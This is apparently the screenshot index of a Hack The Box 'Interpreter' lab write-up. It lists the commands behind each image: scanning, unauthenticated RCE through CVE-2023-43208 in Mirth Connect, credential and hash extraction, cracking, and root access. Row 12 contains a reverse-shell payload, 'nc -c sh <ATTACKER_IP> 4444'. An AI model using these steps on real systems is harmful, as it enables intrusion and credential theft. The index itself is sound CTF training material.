# Screenshots index — HTB Interpreter

This folder should contain the evidence images referenced by `../README.md`.

| # | Filename | Captured command / action | Used in README |
|---:|---|---|---|
| 01 | `interpreter_01_ping.png` | `ping -c 1 10.129.23.60` | `## 1. Initial Enumeration` → `### 1.1 Connectivity Test` |
| 02 | `interpreter_02_nmap_allports.png` | `nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.23.60 -oG allPorts` | `## 1. Initial Enumeration` → `### 1.2 Port Scanning` |
| 03 | `interpreter_03_extractports.png` | `extractPorts allPorts` | `## 1. Initial Enumeration` → `### 1.2 Port Scanning` |
| 04 | `interpreter_04_nmap_targeted_1.png` | `nmap -sCV -p22,80,443,6661 10.129.23.60 -oN targeted` (first page) | `## 1. Initial Enumeration` → `### 1.3 Targeted Scan` |
| 05 | `interpreter_05_nmap_targeted_2.png` | `cat targeted` (second page / remainder) | `## 1. Initial Enumeration` → `### 1.3 Targeted Scan` |
| 06 | `interpreter_06_whatweb_http.png` | `whatweb http://10.129.23.60/` | `## 2. Service Enumeration` → `### 2.1 HTTP surface` |
| 07 | `interpreter_07_curl_http_landing.png` | `curl http://10.129.23.60/` | `## 2. Service Enumeration` → `### 2.1 HTTP surface` |
| 08 | `interpreter_08_curl_webadmin_index.png` | `curl -k -i https://10.129.23.60/webadmin/Index.action` | `## 2. Service Enumeration` → `### 2.2 HTTPS administrator endpoints` |
| 09 | `interpreter_09_mirth_webadmin_ui.png` | Browser view of Mirth Connect Administrator / Web Dashboard (HTTPS) | `## 2. Service Enumeration` → `### 2.2 HTTPS administrator endpoints` |
| 10 | `interpreter_10_webstart_jnlp.png` | `curl -k https://10.129.23.60/webstart.jnlp -o webstart.jnlp` + `cat webstart.jnlp` | `## 2. Service Enumeration` → `### 2.2 HTTPS administrator endpoints` |
| 11 | `interpreter_11_launcher_404.png` | `curl -k -i https://10.129.23.60/launcher/` | `## 2. Service Enumeration` → `### 2.2 HTTPS administrator endpoints` |
| 12 | `interpreter_12_cve_2023_43208_poc.png` | `python3 CVE-2023-43208.py -u https://10.129.23.60 -c 'nc -c sh <ATTACKER_IP> 4444'` | `## 3. Foothold` → `### 3.1 Version confirmation + unauthenticated RCE` |
| 13 | `interpreter_13_nc_callback_mirth.png` | `nc -lvnp 4444` showing callback + initial commands | `## 3. Foothold` → `### 3.1 Version confirmation + unauthenticated RCE` |
| 14 | `interpreter_14_mirth_shell_identity.png` | `whoami`, `id`, `hostname` (as `mirth`) | `## 3. Foothold` → `### 3.1 Version confirmation + unauthenticated RCE` |
| 15 | `interpreter_15_mirth_properties.png` | `cat /usr/local/mirthconnect/conf/mirth.properties` | `## 3. Foothold` → `### 3.2 Local DB credentials` |
| 16 | `interpreter_16_mysql_show_tables.png` | `mysql …` + `SHOW TABLES;` | `## 4. Privilege Escalation` → `### 4.1 User pivot` |
| 17 | `interpreter_17_mysql_sedric_verifier.png` | SQL extracting `sedric` verifier (`PERSON` + `PERSON_PASSWORD`) | `## 4. Privilege Escalation` → `### 4.1 User pivot` |
| 18 | `interpreter_18_verifier_hex_decode.png` | `base64 -d | xxd` + salt/DK base64 recomputation | `## 4. Privilege Escalation` → `### 4.1 User pivot` |
| 19 | `interpreter_19_hashcat_cracked_sedric.png` | `hashcat -m 10900 …` showing **Cracked** | `## 4. Privilege Escalation` → `### 4.1 User pivot` |
| 20 | `interpreter_20_ssh_sedric.png` | `ssh sedric@10.129.23.60` session banner / `whoami` | `## 4. Privilege Escalation` → `### 4.1 User pivot` |
| 21 | `interpreter_21_user_flag.png` | `cat /home/sedric/user.txt` | `## 4. Privilege Escalation` → `### 4.1 User pivot` |
| 22 | `interpreter_22_ss_notif_listener.png` | `ss -ltnp | grep ':54321'` | `## 4. Privilege Escalation` → `### 4.2 Root access via notif.py` |
| 23 | `interpreter_23_ps_notif_root.png` | `ps -fp … notif.py` | `## 4. Privilege Escalation` → `### 4.2 Root access via notif.py` |
| 24 | `interpreter_24_cat_notif_py.png` | `cat /usr/local/bin/notif.py` | `## 4. Privilege Escalation` → `### 4.2 Root access via notif.py` |
| 25 | `interpreter_25_python_requests_baseline_notif.png` | Baseline `requests.post` to `/addPatient` | `## 4. Privilege Escalation` → `### 4.2 Root access via notif.py` |
| 26 | `interpreter_26_python_requests_root_flag_via_notif.png` | `requests.post` returning embedded `root.txt` content | `## 4. Privilege Escalation` → `### 4.2 Root access via notif.py` |
